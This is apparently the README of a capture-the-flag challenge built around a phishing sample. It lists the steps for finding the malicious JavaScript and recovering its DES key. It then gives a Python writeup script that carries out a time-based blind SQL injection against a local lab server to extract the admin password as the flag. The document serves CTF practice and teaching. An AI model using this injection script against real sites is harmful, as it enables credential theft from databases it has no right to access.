# Phishing Attack Sample

警告：此题目源码切不可用于非法用途

## 步骤

1. 手机端（或改ua）打开钓鱼页(也可直接抓包看js去，但是钓鱼的前端我们就白伪造了)

2. 抓包看http历史，得到evil js和真实钓鱼网站（可参考（[从钓鱼样本到某大厂存储型XSS](http://www.k0rz3n.com/2018/04/29/%E4%BB%8E%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%B0%E6%9F%90%E5%A4%A7%E5%8E%82%E5%AD%98%E5%82%A8%E5%9E%8BXSS/)或[Anatomy of a Phishing Attack Sample](https://amyang.xyz/posts/Anatomy-of-a-Phishing-Attack-Sample)））

3. 解密evil js知道钓鱼思路并获得des加密的key（前端加密数据包）

4. 普通insert时间盲注钓鱼网站即可获得flag(admin密码)

## Writeup

```python
from Crypto.Cipher import DES
import base64
import requests

def des_ecb_encrypt(key, text):
    des = DES.new(key, DES.MODE_ECB)
    return des.encrypt(text)

def padding(form):
    return form + ("1"*(8-len(form)%8))

def doRequest(payload):
    url = "http://127.0.0.1:8001/f701fee85540b78d08cb276d14953d58"
    try:
        req = requests.post(url,data={"data":payload},timeout=3)
    except:
        return 1

if __name__ == '__main__':
    key = 'MiaoMiao'
    flag = ''
    for i in range(1,39):
        for char in '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_-{}':
            payload = "a'xor if(ascii(substr((select password from admin limit 1),%d,1))=%d,sleep(5),null)='" % (i,ord(char))
            form = "hrUW3PG7mp3RLd3dJu=123456789&LxMzAX2jog9Bpjs07jP=%s&ip="%(payload)
            encrypted = base64.b64encode(des_ecb_encrypt(key, padding(form)))
            if doRequest(encrypted):
                flag += char
                print(flag)
                break
    print(flag)
```

## 部署

`docker-compose up --build`